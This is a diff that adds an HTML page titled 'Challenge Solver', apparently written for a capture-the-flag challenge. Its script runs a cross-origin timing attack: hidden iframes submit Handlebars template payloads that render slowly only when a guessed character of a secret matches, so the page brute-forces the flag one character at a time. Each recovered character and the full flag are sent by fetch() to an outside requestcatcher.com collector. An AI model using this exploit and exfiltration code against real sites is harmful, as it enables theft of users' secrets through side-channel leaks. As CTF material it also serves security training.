@@ -1,0 +1,86 @@
+<html>
+    <head>
+        <title>Challenge Solver</title>
+    </head>
+    <body>
+        <h1>Challenge Solver</h1>
+    </body>
+</html>
+
+<script type="module">
+const sleep = (ms) => {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+const THRESHOLD = 1500; // ms — tune this: match loads slowly, no-match loads fast
+
+const leak = (url) => {
+    return new Promise(r => {
+        let iframe = document.createElement('iframe');
+        iframe.style.width = '1px';
+        iframe.style.height = '1px';
+        const start = performance.now();
+
+        iframe.onload = async () => {
+            const elapsed = performance.now() - start;
+            console.debug(`iframe loaded in ${elapsed.toFixed(0)}ms`);
+            await sleep(50);
+            iframe.remove();
+            // Slow load = match (heavy template rendered), fast = no match
+            r(elapsed > THRESHOLD ? 1 : 0);
+        };
+
+        iframe.src = url;
+        document.body.appendChild(iframe);
+    });
+}
+
+const CHALL_URL = "https://todolist.challs.srdnlen.it"
+
+let charset = "abcdefghijklmnopqrstuvwxyz_}".split("")
+let flag = "srdnlen{"
+console.log("initial flag: " + flag)
+
+// Warm-up request to establish connection
+await sleep(1000);
+console.log("starting leak...");
+
+while (true) {
+    let found = false;
+    for (let char of charset) {
+        console.log("testing char: " + char)
+
+        var template = `{{#if (eq secret.[${flag.length}] "${char}")}} 
+                    {{#each data}}{{#each ../data}}{{this}}{{/each}}{{/each}}
+                    {{else}} not equal 
+                    {{/if}}`
+        var data = `{"data":[` + `1,`.repeat(1000) + `1]}`
+        var url = `${CHALL_URL}/?template=${encodeURIComponent(template)}&data=${encodeURIComponent(data)}&random=${Math.random()}`
+
+        var res = await leak(url)
+        console.log('leak result: ' + res)
+
+        if (res == 1) {
+            flag += char
+            console.log("found char: " + char, " new flag: " + flag)
+            fetch("https://something.requestcatcher.com/test?data=" + encodeURIComponent("found char: " + char + " new flag: " + flag)).catch(() => 1)
+            found = true;
+            await sleep(500);
+            break
+        }
+
+        await sleep(200);
+    }
+
+    if (!found) {
+        console.log("no char found, retrying last position...");
+        await sleep(1000);
+    }
+
+    if (flag.endsWith("}")) {
+        console.log("FLAG FOUND: " + flag);
+        fetch("https://something.requestcatcher.com/test?data=" + encodeURIComponent("FLAG: " + flag)).catch(() => 1);
+        break;
+    }
+}
+</script>
